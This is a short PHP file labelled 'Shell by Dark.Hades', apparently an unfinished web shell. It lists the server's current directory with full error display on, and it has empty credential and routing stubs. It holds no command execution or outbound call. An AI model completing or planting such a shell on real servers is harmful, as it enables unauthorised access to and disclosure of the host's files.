<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
/**
 * Shell by Dark.Hades
 */

$secure = array(
  'username'      => '',
  'password'      => '',
);
function route() {
  
}
function getDir($dir='.') {
  $files = scandir($dir);
  foreach($files as $key => $value){
      $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
      if(!is_dir($path)) {
          $results[] = $path;
      } else if($value != "." && $value != "..") {
          // getDir($path, $results);
          $results[] = $path;
      }
  }
  return $results;
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title></title>
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/jstree/3.2.1/themes/default/style.min.css" />
  </head>
  <body>
    <?php var_dump(getDir()); ?>
    <script src="//code.jquery.com/jquery-3.1.0.min.js" type="text/javascript" charset="utf-8"></script>
    <!-- <script src="//raw.githubusercontent.com/ludo/jquery-treetable/master/jquery.treetable.js" type="text/javascript" charset="utf-8"></script> -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/jstree/3.2.1/jstree.min.js" type="text/javascript" charset="utf-8"></script>

  </body>
</html>
